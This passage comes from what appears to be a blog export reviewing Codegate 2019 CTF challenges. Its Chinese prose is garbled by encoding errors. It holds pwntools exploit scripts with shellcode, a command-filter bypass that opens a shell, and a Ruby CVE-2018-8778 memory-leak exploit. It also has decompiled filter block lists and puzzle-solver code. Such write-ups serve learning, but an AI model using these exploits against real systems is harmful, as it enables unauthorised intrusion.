jNF\\xbb`#\\t\\x13a\\xd8u\\x96G\\xe0\\xfcW5iAS\\xbb&#123;\"jUR\\xd8v\\x95R\\xe0\\xe7Ci/rS\\xb8t\\x04jNF\\xbb0\\xa2R\\xe3\\xe8V|4f0\\xfeG\\x19iAS\\xbb+\\xaa1\\xa5\\xdbV\\x0c;s0\\xd1\\x86t5R\\xbb\\xc5\\x92\\xac\\xcf\\xd1\\xa6t5R\\xbb\\xdf\\x92\\xac\\xcf\\xe5&#123;\\x15/rS\\xb8THjNF\\xbbxC\\t\\x13a\\xd8%i\\x1c\\x10u\\xd9V\\xce8s0/\\xcf\\xc94\\xdb\\xa3\\xba\\xa7\\xec T\\x060\\xcdRS3a\\xbb\\xda\\x9e\\xb9\\xcf\\xcdRS3a\\xbbI\\x90\\xb9\\xcf', asm(shellcode))]xorkey = bytearray(xorkey)print hexdump(xorkey)assert all(x not in str(xorkey) for x in '\\x00 \\r\\r\\n\\t')payload = ('AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP').ljust(0xc0, '\\x00') + xorkey + '\\x00'r.sendline(payload)r.interactive() 20000ç»™äº†ä¸€ä¸ª64ä½çš„elfè¿˜æœ‰20000ä¸ª.soæ–‡ä»¶ã€‚æ‹–è¿›idaçœ‹åˆ°mainå‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v3; // rax signed __int64 result; // rax void *v5; // rdi char *v6; // rax int number; // [rsp+Ch] [rbp-94h] void (__fastcall *v8)(void *, const char *); // [rsp+10h] [rbp-90h] void *handle; // [rsp+18h] [rbp-88h] char s; // [rsp+20h] [rbp-80h] int v11; // [rsp+80h] [rbp-20h] int v12; // [rsp+84h] [rbp-1Ch] unsigned __int64 v13; // [rsp+88h] [rbp-18h] v13 = __readfsqword(0x28u); backgroud(); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(&amp;s, 0, 0x60uLL); v11 = 0; printf(\"INPUT : \", 0LL, &amp;v12); __isoc99_scanf(\"%d\", &amp;number); if ( number &lt;= 0 &amp;&amp; number &gt; 20000 ) &#123; printf(\"Invalid Input\", &amp;number); exit(-1); &#125; sprintf(&amp;s, \"./20000_so/lib_%d.so\", (unsigned int)number); handle = dlopen(&amp;s, 1); if ( handle ) &#123; v5 = handle; v8 = (void (__fastcall *)(void *, const char *))dlsym(handle, \"test\"); if ( v8 ) &#123; v8(v5, \"test\"); dlclose(handle); result = 0LL; &#125; else &#123; v6 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v6); dlclose(handle); result = 1LL; &#125; &#125; else &#123; v3 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v3); result = 1LL; &#125; return result;&#125; ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª0ï½20000ä¹‹é—´çš„æ•°å­—ï¼Œç„¶åä¼šè¯»å–ä»»æ„ä¸€ä¸ª.soæ–‡ä»¶ã€‚ä¸»è¦æ˜¯ä¸¤ä¸ªå‡½æ•°dlopenå’Œdlsymï¼Œå‰è€…æ‰“å¼€åŠ¨æ€é“¾æ¥åº“ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¥æŸ„ï¼›åè€…ç”¨æ¥æ‰“å¼€åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ã€‚ éšæœºæ‰“å¼€å‡ ä¸ª.soæ–‡ä»¶çœ‹çœ‹æœ‰ä»€ä¹ˆã€‚lib_1139.soä¸­çœ‹åˆ°ä¸€ä¸ªtest()å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354signed __int64 test()&#123; char *v0; // rax signed __int64 result; // rax char *v2; // rax void (__fastcall *v3)(char *, char *); // [rsp+0h] [rbp-B0h] void (__fastcall *v4)(char *); // [rsp+8h] [rbp-A8h] void *handle; // [rsp+10h] [rbp-A0h] void *v6; // [rsp+18h] [rbp-98h] char buf; // [rsp+20h] [rbp-90h] __int16 v8; // [rsp+50h] [rbp-60h] char s; // [rsp+60h] [rbp-50h] __int16 v10; // [rsp+90h] [rbp-20h] unsigned __int64 v11; // [rsp+98h] [rbp-18h] v11 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x30uLL); v8 = 0; memset(&amp;s, 0, 0x30uLL); v10 = 0; handle = dlopen(\"./20000_so/lib_17305.so\", 1); if ( handle ) &#123; v3 = (void (__fastcall *)(char *, char *))dlsym(handle, \"filter1\"); v6 = dlopen(\"./20000_so/lib_2850.so\", 1); if ( v6 ) &#123; v4 = (void (__fastcall *)(char *))dlsym(v6, \"filter2\"); puts(\"This is lib_1139 file.\"); puts(\"How do you find vulnerable file?\"); read(0, &amp;buf, 0x32uLL); v3(&amp;buf, &amp;buf); v4(&amp;buf); sprintf(&amp;s, \"ls \\\"%s\\\"\", &amp;buf); system(&amp;s); dlclose(handle); dlclose(v6); result = 0LL; &#125; else &#123; v2 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v2); result = 0xFFFFFFFFLL; &#125; &#125; else &#123; v0 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v0); result = 0xFFFFFFFFLL; &#125; return result;&#125; çœ‹åˆ°æ˜¯è¯»å–è¾“å…¥ä½œä¸ºå‚æ•°æ¥æ‰§è¡Œlså‘½ä»¤ã€‚åœ¨lib_12071.soé‡Œæ‰¾åˆ°ä¸€ä¸ªfilter1()å‡½æ•°ï¼š 12345678910111213141516171819202122232425char *__fastcall filter1(const char *a1)&#123; char *result; // rax if ( strchr(a1, ';') ) exit(0); if ( strchr(a1, '*') ) exit(0); if ( strchr(a1, '|') ) exit(0); if ( strchr(a1, '&amp;') ) exit(0); if ( strchr(a1, '$') ) exit(0); if ( strchr(a1, '`') ) exit(0); if ( strchr(a1, '&gt;') ) exit(0); if ( strchr(a1, '&lt;') ) exit(0); result = strchr(a1, 'r'); if ( result ) exit(0); return result;&#125; è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ã€‚åœ¨lib_9494.soä¸­è¿˜æœ‰ä¸€ä¸ªfilter2()å‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829char *__fastcall filter2(const char *a1)&#123; char *result; // rax if ( strchr(a1, 'v') ) exit(0); if ( strchr(a1, 'm') ) exit(0); if ( strchr(a1, 'p') ) exit(0); if ( strchr(a1, 'd') ) exit(0); if ( strchr(a1, 'n') ) exit(0); if ( strstr(a1, \"bin\") ) exit(0); if ( strstr(a1, \"sh\") ) exit(0); if ( strstr(a1, \"bash\") ) exit(0); if ( strchr(a1, 'f') ) exit(0); if ( strchr(a1, 'l') ) exit(0); result = strchr(a1, 'g'); if ( result ) exit(0); return result;&#125; ä¹Ÿæ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œè¿˜æœ‰bashå’Œshè¿™äº›å­—ä¸²ã€‚é‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®è®¤æ‰€æœ‰çš„.soæ–‡ä»¶å¿…å®šåªåŒ…å«ç€ä¸‰ä¸ªæ ‡å¿—ã€‚æ¥ä¸‹æ¥ä¸»è¦æ˜¯åˆ†æ.soæ–‡ä»¶ä¸­çš„è¿™ä¸‰ä¸ªsymbolï¼štestã€filter1ã€filter2ã€‚testæ˜¯mainå‡½æ•°ä¸­ä¼šè°ƒç”¨çš„ï¼Œfilteråˆ™æ˜¯åœ¨ä¸€äº›æ–‡ä»¶çš„test()ä¸­ä¼šè°ƒç”¨ï¼Œå…¶ä¸­filter2()æ˜¾ç„¶æ˜¯æœ€å…³é”®çš„ä¸€ä¸ªåœ°æ–¹ã€‚ç”¨r2pipeæ¥å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼ˆå®‰è£…æ–¹æ³•ï¼‰ï¼š é¦–å…ˆéå†æ¯ä¸ªæ–‡ä»¶ï¼ŒæŸ¥æ‰¾å…¶ä¸­çš„ç¬¦å·å¹¶åŠ å…¥åˆ°åˆ—è¡¨ä¸­ï¼š 1234567891011121314151617181920import r2pipetest = []filter1 = []filter2 = []for i in range(1, 20000+1): print i r2 = r2pipe.open('./20000_so/lib_&#123;&#125;.so'.format(i)) if 'dlopen' in r2.cmd('ii'): test.append(i) if 'filter1' in r2.cmd('is'): filter1.append(i) if 'filter2' in r2.cmd('is'): filter2.append(i) r2.quit()print testprint filter1print filter2 å…ˆæŸ¥æ‰¾ä¸€ä¸‹filter1æ¯ä¸ªæ–‡ä»¶çš„symbolæ˜¯å¦æœ‰ä¸åŒçš„åœ°æ–¹ï¼š 12345678910111213141516171819for i in filter1: r2 = r2pipe.open('./20000_so/lib_&#123;&#125;.so'.format(i)) r2.cmd('aaa') keys = ['0x3b', '0x2a', '0x7c', '0x26', '0x24', '0x60', '0x3e', '0x3c', '0x72'] out = r2.cmd('pdf @ sym.filter1') res = [] same = True for k in keys: if k not in out: same = False if not same: res.append(i) print str(i) r2.quit()print 'res: ', res lib_4323.soä¸­çš„filter1ï¼Œä¸ä¹‹å‰ç›¸æ¯”å°‘è¿‡æ»¤äº†ä¸€ä¸ª|ï¼š 1234567891011121314151617181920212223char *__fastcall filter1(const char *a1)&#123; char *result; // rax if ( strchr(a1, ';') ) exit(0); if ( strchr(a1, '*') ) exit(0); if ( strchr(a1, '`') ) exit(0); if ( strchr(a1, '&amp;') ) exit(0); if ( strchr(a1, '$') ) exit(0); if ( strchr(a1, '&gt;') ) exit(0); if ( strchr(a1, '&lt;') ) exit(0); result = strchr(a1, 'r'); if ( result ) exit(0); return result;&#125; æ¥ä¸‹æ¥åœ¨testä¸­æ‰¾ä¸€ä¸‹ç”¨äº†è¿™ä¸ªfilterçš„.soæ–‡ä»¶ï¼š 1234567for i in test: r2 = r2pipe.open('./20000_so/lib_&#123;&#125;.so'.format(i)) if r2.cmd('iz~./20000_so/lib_4323.so') != '': print i r2.quit() æœ€åç­›é€‰å‡ºlib_17394.soï¼Œå‘ç°å…¶ä¸­æœ‰ï¼š 12sprintf(&amp;s, \"%s 2 &gt; /dev/null\", &amp;buf, v4);system(&amp;s); ç›´æ¥é€ä¸€ä¸ªshä¸Šå»å°±èƒ½æ‹¿åˆ°shelläº†ï¼š 1234567891011121314151617181920212223# qianfei @ qianfeideMacBook-Air in ~/Desktop/2019-codegate/20000 [12:41:06] $ nc 110.10.147.106 15959 /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$__ $$ /$$$_ $$ /$$$_ $$ /$$$_ $$ /$$$_ $$ |__/ \\ $$| $$$$\\ $$| $$$$\\ $$| $$$$\\ $$| $$$$\\ $$ /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$ /$$____/ | $$\\ $$$$| $$\\ $$$$| $$\\ $$$$| $$\\ $$$$ | $$ | $$ \\ $$$| $$ \\ $$$| $$ \\ $$$| $$ \\ $$$ | $$$$$$$$| $$$$$$/| $$$$$$/| $$$$$$/| $$$$$$/ |________/ \\______/ \\______/ \\______/ \\______/ INPUT : 17394This is lib_17394 file.How do you find vulnerable file?shls2000020000_so20000_so.tar.gzflagcat flagflag&#123;Are_y0u_A_h@cker_in_real-word?&#125; algo_auth1234567891011121314151617181920212223242526272829303132$ nc 110.10.147.104 15712 ==&gt; Hi, I like an algorithm. So, i make a new authentication system.==&gt; It has a total of 100 stages.==&gt; Each stage gives a 7 by 7 matrix below sample.==&gt; Find the smallest path sum in matrix, by starting in any cell in the left column and finishing in any cell in the right column, and only moving up, down, and right.==&gt; The answer for the sample matrix is 12.==&gt; If you clear the entire stage, you will be able to authenticate.[sample]99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 1 1 1 99 1 1 1 1 99 1 99 1 99 99 99 99 1 1 1 99 If you want to start, type the G key within 10 seconds....&gt;&gt; G*** STAGE 1 ***18 17 16 15 14 13 12 9 11 13 15 17 19 21 18 17 16 15 14 13 12 14 16 18 20 22 24 26 16 15 14 13 12 11 10 6 8 10 12 14 16 18 22 21 20 19 18 17 16 Answer within 10 seconds &gt;&gt;&gt; 1wrong!! Try again!! ä¸€é“ppcï¼Œåœ¨7*7çš„çŸ©é˜µä¸­å¯»æ‰¾ä»æœ€å·¦åˆ—åˆ°æœ€å³åˆ—çš„æœ€çŸ­è·¯ã€‚åˆ†åˆ«åœ¨csdnå’Œgeeksforgeeksä¸Šæ‰¾åˆ°dijkstraå®ç°çš„å¯»æ‰¾çŸ©é˜µæœ€çŸ­è·¯ã€‚å›ç­”å®Œ100é“é¢˜ç›®ä¹‹åï¼Œä¼šå‘Šè¯‰ä½ @@@@@ Congratz! Your answers are an answerï¼Œå°è¯•å°†æ‰€æœ‰çš„ç­”æ¡ˆè½¬asciiï¼Œå¾—åˆ°base64åçš„flagã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/env pythonfrom pwn import *import numpy as npimport base64context.log_level = 'debug'# p = remote('110.10.147.104', 15712)p = remote('110.10.147.109', 15712)p.sendlineafter('If you want to start, type the G key within 10 seconds....&gt;&gt;', 'G')def minDistance(distances, sptSet, dimension): min_ = np.inf min_index = 0 for i in range(dimension): if sptSet[i] == False and distances[i] &lt; min_: min_ = distances[i] min_index = i return min_indexdef dijkstra(graph, source, dimension): sptSet = [] distances = [] for i in range(dimension): distances.append(np.inf) sptSet.append(False) distances[source] = 0 for i in range(dimension): u = minDistance(distances, sptSet, dimension) sptSet[u] = True for v in range(dimension): if sptSet[v] == False and graph[u][v] &gt; 0 and distances[u] + graph[u][v] &lt; distances[v]: distances[v] = distances[u] + graph[u][v] # print distances res = [] for i in range(1, 8): res.append(distances[i * 7 - 1]) print res return resdef xy2num(x, y): if x &lt; 0 or x &gt;= 7: return -1 if y &lt; 0 or y &gt;= 7: return -1 return y * 7 + xflag = ''for i in range(100): p.recvuntil('*** STAGE &#123;&#125; ***\\n'.format(str(i + 1))) matrix = [] for j in range(7): t = p.recvline()[:-1] row = [] for k in range(len(t) / 3): # print type(t[3*k:3*(k+1)].strip(' ')) row.append(int(t[3*k:3*(k+1)].strip(' '))) matrix.append(row) # print matrix min_length = np.inf adj = [] for y in range(7): for x in range(7): t = [0] * (7 * 7) if xy2num(x - 1, y) &gt;= 0: t[xy2num(x - 1, y)] = matrix[y][x - 1] if xy2num(x + 1, y) &gt;= 0: t[xy2num(x + 1, y)] = matrix[y][x + 1] if xy2num(x, y - 1) &gt;= 0: t[xy2num(x, y - 1)] = matrix[y - 1][x] if xy2num(x, y + 1) &gt;= 0: t[xy2num(x, y + 1)] = matrix[y + 1][x] adj.append(t) for j in range(7): tmp = min(dijkstra(adj, j * 7, 7 * 7)) tmp += matrix[j][0] min_length = min(min_length, tmp) flag += chr(min_length) payload = str(min_length) p.sendlineafter('Answer within 10 seconds &gt;&gt;&gt;', payload)print 'flag:', base64.b64decode(flag)p.interactive() è¿˜æœ‰å¦ä¸€ç§åšæ³•ä»£ç æ›´ç®€çŸ­ä¸€ç‚¹å°±æ˜¯ç”¨èƒŒåŒ…ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env pythonfrom pwn import *import base64context.log_level = 'debug'# p = remote('110.10.147.104', 15712)p = remote('110.10.147.109', 15712)p.sendlineafter('If you want to start, type the G key within 10 seconds....&gt;&gt;', 'G')def cal(m): size = len(m) res = [] for i in range(size): res.append(m[i][size - 1]) for i in range(size - 2, -1, -1): res[0] += m[0][i] for j in range(1, size): res[j] = min(res[j - 1] + m[j][i], res[j] + m[j][i]) for j in range(size - 2, -1, -1): res[j] = min(res[j], res[j + 1] + m[j][i]) return min(res)flag = ''for i in range(100): p.recvuntil('*** STAGE &#123;&#125; ***\\n'.format(str(i + 1))) matrix = [] for j in range(7): t = p.recvline()[:-1] row = [] for k in range(len(t) / 3): # print type(t[3*k:3*(k+1)].strip(' ')) row.append(int(t[3*k:3*(k+1)].strip(' '))) matrix.append(row) # print matrix min_length = cal(matrix) flag += chr(min_length) payload = str(min_length) p.sendlineafter('Answer within 10 seconds &gt;&gt;&gt;', payload)print 'flag:', base64.b64decode(flag)p.interactive() THE Matrixçœ‹äº†PPPå¤§ä½¬ä»¬çš„writeupï¼Œä¸‹äº†ä¸ªBGBæ¥è°ƒè¯•ï¼ŒåŒæ—¶å¯ä»¥æŸ¥çœ‹å†…å­˜ä»¥åŠpatchã€‚æ”¾ä¸Šè„šæœ¬ï¼š 1234567891011121314#!/usr/bin/env pythondata = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x7E, 0x7E, 0x7E, 0x7E, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x7E, 0x7E, 0x7E, 0x7E, 0x60, 0x60, 0x7E, 0x7E, 0x7E, 0x7E, 0x60, 0x60, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x62, 0x62, 0x66, 0x66, 0x7E, 0x7E, 0x78, 0x78, 0x6C, 0x6C, 0x6E, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC1, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0x7E, 0x7E, 0xFF, 0xFF, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xFF, 0xFF, 0x7E, 0x7E, 0xC3, 0xC3, 0xE3, 0xE3, 0xF3, 0xF3, 0xFB, 0xFB, 0xDF, 0xDF, 0xCF, 0xCF, 0xC7, 0xC7, 0xC3, 0xC3, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x3C, 0x7E, 0x7E, 0xC3, 0xC3, 0xC3, 0xC3, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0xC3, 0xC3, 0xC3, 0xFE, 0xFE, 0xFE, 0xFE, 0xC6, 0xC6, 0xC0, 0xC0, 0xDF, 0xDF, 0xC1, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0xF0, 0xF0, 0xF0, 0xF0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xF0, 0xF0, 0xF0, 0xF0, 0x0F, 0x0F, 0x0F, 0x0F, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x0F, 0x0F, 0x0F, 0x0F, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x7E, 0x7E, 0x7E, 0x7E, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x7E, 0x7E, 0x7E, 0x7E, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0xFE, 0xFE, 0xFE, 0xFE, 0x82, 0x00, 0xEE, 0x6C, 0x82, 0x00, 0xBA, 0x38, 0x00, 0x00, 0x40, 0x00, 0xC3, 0xC3, 0xE3, 0xE3, 0xF3, 0xF3, 0xFB, 0xFB, 0xFF, 0xFF, 0xDF, 0xDF, 0xCF, 0xCF, 0xC7, 0xC7, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xFF, 0xFF, 0x81, 0x81, 0xA5, 0xA5, 0x81, 0x81, 0x7E, 0x7E, 0xFF, 0xFF, 0x81, 0xE7, 0x81, 0xFF, 0x81, 0xDB, 0x81, 0xDB, 0x81, 0xDB, 0x81, 0xC3, 0xFF, 0xFF, 0xFF, 0xFF, 0x81, 0xFF, 0x81, 0xFF, 0x81, 0x99, 0x81, 0x99, 0x81, 0x99, 0x81, 0x99, 0xFF, 0xFF, 0x7E, 0x7E, 0xC3, 0xC3, 0x81, 0x81, 0xFF, 0xFF, 0xA5, 0xA5, 0x81, 0x81, 0xC3, 0xDB, 0x7E, 0x7E, 0x7E, 0x7E, 0xFF, 0xE7, 0xFF, 0xC3, 0xFF, 0xFF, 0xFF, 0xA5, 0xFF, 0x81, 0xE7, 0xDB, 0x7E, 0x7E, 0x1F, 0x1F, 0x31, 0x3F, 0x61, 0x7F, 0xC1, 0xFF, 0xC1, 0xFF, 0x61, 0x7F, 0x3F, 0x3F, 0x1F, 0x1F, 0xFF, 0xFF, 0x9D, 0xE3, 0x8D, 0xF3, 0x85, 0xFB, 0xA1, 0xDF, 0xB1, 0xCF, 0xB9, 0xC7, 0xFF, 0xFF]tiles = []for x in range(18): tiles += [[data[x * 16 + y] for y in range(16)]]for c in [13, 0, 1, 2, 3, 2, 4, 16, 5, 4, 8, 7, 4, 5, 6, 7, 8]: tile = tiles[c] for x in tile: print ('0'*8 + bin(x)[2:])[-8:].replace('0', ' ').replace('1', '0') print '\\n' mini converterç»™äº†ä¸€ä»½rubyçš„æºç ã€‚çœ‹äº†writeupçŸ¥é“äº†æ˜¯CVE-2018-8778ã€‚rubyçš„ç‰ˆæœ¬åœ¨2.5.1ä¹‹å‰å­˜åœ¨è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæ¼æ´å¦‚ä¸‹ï¼š 1puts input.unpack(\"C*#&#123;input&#125;.length\") è¿™é‡Œå°†è¾“å…¥è½¬æ¢æˆunpackæ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶unpackçš„ç»“æœæ¥æ³„æ¼flagã€‚åœ¨rubyçš„unpackæ ¼å¼ä¸­ï¼Œ@å¯ä»¥è·³è¿‡å‚æ•°é•¿åº¦ç»™çš„åç§»ã€‚å¦‚æœæˆ‘ä»¬é€ä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•°ï¼Œé‚£ä¹ˆå°±ä¼šæº¢å‡ºæˆè´Ÿæ•°ã€‚ä»è€Œæˆ‘ä»¬å¯ä»¥æ³„éœ²ä¹‹å‰çš„å†…å®¹ï¼ŒåŒ…æ‹¬flagã€‚è¿™é‡Œæ”¾ä¸€ä¸‹å¤§ä½¬çš„expï¼š 12345678910111213141516from pwn import *context.log_level = 'debug'p = remote('110.10.147.105', 12137)p.recvuntil('to exit\\n')targlen = 0x10000for i in range(1, 100): payload = 'a @&#123;&#125;a&#123;&#125; '.format(2**64 - targlen*i, targlen + 0x100) p.sendline(payload) p.recvuntil('hex\\n') p.sendline('1') print 'memdump #&#123;&#125;'.format(i) data = p.recvuntil('to exit\\n') if 'FLAG&#123;' in data: st = data.find('FLAG&#123;') print data[st:data.find('&#125;', st) + 1] break PyProt3ctä¸€é“æœ‰ç‚¹éš¾çš„è™šæ‹Ÿæœºï¼Œæ‰€æœ‰çš„å˜é‡è¿˜æœ‰å‡½æ•°åå‡ ä¹éƒ½æ˜¯å½¢å¦‚O0O0OOO00OO00O000çš„æ··æ·†ã€‚å…ˆç®€å•åœ°è§£æ··æ·†ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import ref = open('play.py.bak')t = f.read()f.close()# funcpat = r'def ([O0]&#123;17&#125;)'reg = re.compile(pat)func = reg.findall(t)[:-1]for i in range(len(func)): t = t.replace(func[i], 'f&#123;&#125;'.format(str(i)))# argpat = r'def f\\d\\d?\\(([O0]&#123;17&#125;)\\)'reg = re.compile(pat)arg = reg.findall(t)for i in range(len(arg)): t = t.replace(arg[i], 'dic')# elsepat = r'([O0]&#123;17&#125;)=dict\\(\\)'reg = re.compile(pat)dic = reg.findall(t)for i in range(len(dic)): t = t.replace(dic[i], 'dic')pat = r'([O0]&#123;17&#125;)=1000'reg = re.compile(pat)ret_addr = reg.findall(t)for i in range(len(ret_addr)): t = t.replace(ret_addr[i], 'ret_addr')pat = r'([O0]&#123;17&#125;)=1001'reg = re.compile(pat)ret_val = reg.findall(t)for i in range(len(ret_val)): t = t.replace(ret_val[i], 'ret_val')pat = r'([O0]&#123;17&#125;)=2001'reg = re.compile(pat)str1 = reg.findall(t)for i in range(len(str1)): t = t.replace(str1[i], 'str1')pat = r'([O0]&#123;17&#125;)=2002'reg = re.compile(pat)str2 = reg.findall(t)for i in range(len(str2)): t = t.replace(str2[i], 'str2')pat = r'([O0]&#123;17&#125;)=2003'reg = re.compile(pat)str3 = reg.findall(t)for i in range(len(str3)): t = t.replace(str3[i], 'str3')pat = r'([O0]&#123;17&#125;)=2004'reg = re.compile(pat)str4 = reg.findall(t)for i in range(len(str4)): t = t.replace(str4[i], 'str4')# restpat = r'([O0]&#123;17&#125;)'reg = re.compile(pat)rest = reg.findall(t)rest = list(set(rest))for i in range(len(rest)): t = t.replace(rest[i], 'x&#123;&#125;'.format(str(i)))f = open('play.py', 'wb')f.write(t)f.close() key content (purpose) 1000 return address (mostly int, but object is theoretically possible) 1001 return value (mostly int, but object is theoretically possible) 2001, 2002, 2003, 2004 instruction argument (== oparg) (always byte array) ä»¥ä¸Šå‡ ä¸ªæ•°å­—åˆ¤æ–­å¯¹åº”å‡ ä¸ªkeyã€‚ç„¶åé€ä¸ªå‡½æ•°åˆ¤æ–­æŒ‡ä»¤åŠŸèƒ½ã€‚è¿™é‡Œæ”¾ä¸€ä¸‹pppå¤§ä½¬ç»™çš„åˆ†æè„šæœ¬ã€‚è®°å½•ä¸€ä¸‹Balsnå¤§ä½¬ä»¬ç»™çš„åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526#!/usr/bin/env pythondef encrypt(x): a = x &gt;&gt; 32 a ^= 0xffc2bdec a += 0xffc2bdec a &amp;= 0xffffffff b = x &amp; 0xffffffff b ^= 0xffc2bdec b += 0xffc2bdec b &amp;= 0xffffffff c = ((b &lt;&lt; 32) | a)&amp;0xffffffffffffffff d = ((c &amp; 0x7f) &lt;&lt; 57)&amp;0xffffffffffffffff return ((c &gt;&gt; 7) | d) &amp; 0xffffffffffffffffflag = str(input())flag = int('0x' + flag.encode('hex'), 16)for i in range(0x7f): flag = encrypt(flag)print hex(flag)assert flag == 0xd274a5ce60ef2dca Balsnå¤§ä½¬ä»¬çš„solveè„šæœ¬ï¼š 1234567891011121314#!/usr/bin/env pythondef decrypt(x): c = ((x &lt;&lt; 7) | (x &gt;&gt; 57))&amp;0xffffffffffffffff b = ((((c &gt;&gt; 32)&amp;0xffffffff)-0xffc2bdec)&amp;0xffffffff)^0xffc2bdec a = (((c&amp;0xffffffff)-0xffc2bdec)&amp;0xffffffff)^0xffc2bdec return ((a &lt;&lt; 32) | b)&amp;0xffffffffffffffffflag = 0xd274a5ce60ef2dcafor i in xrange(0x7f): flag = decrypt(flag)print hex(flag)print hex(flag)[2:-1:].decode('hex') å‚è€ƒç½‘ç«™https://lordidiot.github.io/2019-01-27/codegate-junior-quals-2019/https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/https://blog.csdn.net/u010376788/article/details/49764205https://blog.pspaul.de/posts/codegate-pre-2019-pyprot3ct/https://devel0pment.de/?p=1179https://ctftime.org/writeup/12955https://balsn.tw/ctf_writeup/20190126-codegatectf/https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.mdhttps://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/https://github.com/pwning/public-writeup/tree/master/codegate2019/pyprot3ct","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-å®‰æ’æ¯åäºŒæœˆæœˆèµ›-writeup","slug":"ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯åäºŒæœˆæœˆèµ›-writeup","date":"2019-01-25T08:12:19.000Z","updated":"2019-02-01T12:11:22.387Z","comments":true,"path":"2019/01/25/ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯åäºŒæœˆæœˆèµ›-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/01/25/ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯åäºŒæœˆæœˆèµ›-writeup/","excerpt":"è®°å½•ä¸¤é“pwné¢˜ã€‚","text":"è®°å½•ä¸¤é“pwné¢˜ã€‚ messageb0xåŸºç¡€çš„æ ˆæº¢å‡ºã€‚ 